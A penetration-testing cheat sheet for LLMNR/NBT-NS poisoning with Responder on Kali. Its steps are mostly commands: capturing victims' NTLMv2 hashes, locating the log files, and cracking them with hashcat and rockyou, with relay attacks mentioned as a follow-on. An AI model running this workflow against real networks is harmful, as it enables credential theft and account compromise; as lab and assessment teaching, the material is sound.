LLMNR Poisoning - Responder Cheat Sheet

A general LLMNR/NBT-NS poisoning workflow with Responder to capture NTLMv2 hashes.
Replace the placeholders (<...>) with your own values.


Step 1 - Prep Kali's network

Make sure Kali is on the same subnet as your targets. Responder listens on a
specific interface, so confirm you have the right one:

    ip -4 addr show                         # find your lab interface and IP
    sudo nmcli con mod "<connection name>" ipv4.method manual ipv4.addresses <kali-ip>/24
    sudo nmcli con up "<connection name>"


Step 2 - Launch Responder

    sudo responder -I <interface>

    Common flags:
      -I   interface to listen on (e.g. eth0)


Step 3 - Trigger the poisoning

Wait for a victim machine to broadcast an LLMNR or NBT-NS query.
This happens automatically when a user or process tries to reach a hostname
that does not exist in DNS (e.g. a mistyped share name like \\fileserv).
Responder intercepts the broadcast and replies with Kali's IP, causing the
victim to attempt NTLM authentication against Kali.


Step 4 - Capture the NTLMv2 hash

Responder prints captured hashes to the terminal and saves them to:

    /usr/share/responder/logs/

Look for a file named something like:
    SMB-NTLMv2-SSP-<victim-ip>.txt

Each captured hash looks like:
    <username>::<domain>:<challenge>:<response>:<NTLMv2 blob>


Step 5 - Crack the hash offline

Use hashcat with mode 5600 (NTLMv2):

    hashcat -m 5600 <hash-file> <wordlist> --force

Example with rockyou:
    hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt \
            /usr/share/wordlists/rockyou.txt --force


Step 6 - Stop Responder

Press Ctrl+C in the terminal running Responder.
Responder does not modify ARP tables, so no cleanup is needed on the network side.


Step 7 - Restore Kali's normal networking (if changed in Step 1)

    sudo nmcli con mod "<connection name>" ipv4.method auto
    sudo nmcli con up "<connection name>"


Key idea: LLMNR and NBT-NS are fallback name-resolution protocols that broadcast
to the whole subnet when DNS fails. Responder answers those broadcasts and tricks
victims into handing over their NTLMv2 hashes - which can then be cracked offline
or used in relay attacks.
